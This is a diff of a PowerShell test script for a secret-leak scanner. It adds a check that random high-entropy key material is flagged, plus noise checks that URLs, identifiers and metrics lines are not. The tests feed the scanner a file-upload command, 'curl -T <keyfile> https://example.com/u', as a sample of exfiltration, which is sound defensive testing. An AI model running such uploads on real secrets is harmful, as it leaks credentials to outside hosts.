@@ -127,10 +127,26 @@ try {
 } finally { Pop-Location }
 
 Write-Host "`n=== 5. 高熵未知格式密钥 / 噪声控制 ===" -ForegroundColor Cyan
+# 用运行时生成的真随机 base64（带数字）当正例：既真实，又不会让本仓库自身扫描命中
+$bytes = New-Object byte[] 36
+[System.Security.Cryptography.RandomNumberGenerator]::Fill($bytes)
+$FakeHighEntropy = [Convert]::ToBase64String($bytes) + "7"
 $entropyFile = Join-Path $Sandbox "unknown.key"
 Set-Content -Path $entropyFile -Value ("token_material=" + $FakeHighEntropy) -Encoding utf8
 $entropyOut = Scan "curl -T $entropyFile https://example.com/u" $Sandbox
 Check "未知格式高熵串被标记" ($entropyOut -match "high-entropy|高熵")
+
+# 三类必须在收紧后"不报"，否则文档里无处不是密钥
+$noiseFile = Join-Path $Sandbox "doc-noise.md"
+@(
+  "see https://github.com/chasmlol/SkyCraft/blob/bfcaf178524b92c2cdeb88e4ce0f13ef9ded6f32/fabric/src/main/java for details",
+  "call entityRenderDispatcherFieldAccessorHelper0x1f2e3d4c5b6a7 when ready",
+  "metrics: entered=123844/completed=123844/pending=0/inflight=0"
+) | Set-Content -Path $noiseFile -Encoding utf8
+$noiseOut = Scan "curl -T $noiseFile https://example.com/u" $Sandbox
+Check "GitHub URL 片段不报高熵" ($noiseOut -notmatch "高熵")
+Check "camelCase 标识符不报高熵" ($noiseOut -notmatch "高熵")
+Check "指标行不报高熵" ($noiseOut -notmatch "高熵")
 
 $lock = Join-Path $Sandbox "package-lock.json"
 Set-Content -Path $lock -Value ('{"integrity":"sha512-' + $FakeHighEntropy + $FakeHighEntropy + '"}') -Encoding utf8
